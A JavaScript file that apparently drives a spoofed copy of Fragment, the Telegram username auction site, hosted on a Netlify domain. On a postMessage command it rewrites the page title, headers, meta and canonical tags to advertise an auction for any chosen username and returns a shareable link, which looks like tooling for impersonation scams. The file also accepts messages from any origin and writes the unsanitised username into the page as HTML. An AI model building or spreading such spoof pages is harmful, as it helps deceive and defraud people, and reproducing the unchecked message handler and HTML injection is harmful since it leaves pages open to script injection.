/**
 * Fragment Admin Receiver
 * Receives commands from the admin console via postMessage
 */

(function() {
  'use strict';

  // Listen for commands from admin console
  window.addEventListener('message', function(event) {
    // For local testing, accept messages from any origin
    // In production, you should verify: if (event.origin !== 'http://127.0.0.1:8080') return;
    
    const data = event.data;
    
    if (data.type === 'FRAGMENT_ADMIN_COMMAND') {
      switch (data.action) {
        case 'setUsername':
          setUsername(data.username, event.source, event.origin);
          break;
      }
    }
  });

  function setUsername(newUsername, source, origin) {
    if (!newUsername) {
      sendResponse(false, 'Username cannot be empty', source, origin);
      return;
    }

    try {
      const oldUsername = localStorage.getItem('fragmentUsername') || 'board';

      // Save to localStorage
      localStorage.setItem('fragmentUsername', newUsername);

      // Update URL to include username parameter (this is the key!)
      const url = new URL(window.location.href);
      url.searchParams.set('u', newUsername);
      window.history.replaceState({}, '', url);

      // Update page title
      document.title = document.title.replace(oldUsername, newUsername);

      // Update section header with username
      $('.tm-section-header-text .subdomain').text(newUsername);

      // Update "Telegram Username" section
      $('.tm-list-item-value .accent-color').each(function() {
        const text = $(this).text();
        if (text.includes('@' + oldUsername)) {
          $(this).text('@' + newUsername);
        } else if (text.includes('t.me/' + oldUsername)) {
          $(this).text('t.me/' + newUsername);
        } else if (text.includes(oldUsername + '.t.me')) {
          $(this).html('<span class="tm-web3-address"><span class="subdomain">' + newUsername + '</span><span class="domain">.t.me</span></span>');
        }
      });

      // Update all subdomain elements
      $('.subdomain').text(newUsername);

      // Update meta tags
      $('meta[property="og:title"]').attr('content', 'Buy @' + newUsername);
      $('meta[property="og:description"]').attr('content', 'An auction to get the Telegram username @' + newUsername + ' is in progress.');
      $('meta[property="og:url"]').attr('content', 'https://fragmentlink.netlify.app?u=' + newUsername);
      $('link[rel="canonical"]').attr('href', 'https://fragmentlink.netlify.app?u=' + newUsername);

      // Update popup content
      $('.js-howitworks-popup h4').each(function() {
        $(this).html($(this).html().replace('@' + oldUsername, '@' + newUsername));
      });
      
      sendResponse(true, 'Username changed to @' + newUsername + '. Share: ' + url.toString(), source, origin);
    } catch (error) {
      sendResponse(false, 'Error: ' + error.message, source, origin);
    }
  }

  function sendResponse(success, message, source, origin) {
    const response = {
      type: 'FRAGMENT_ADMIN_RESPONSE',
      success: success,
      message: message
    };
    
    source.postMessage(response, origin);
  }

})();
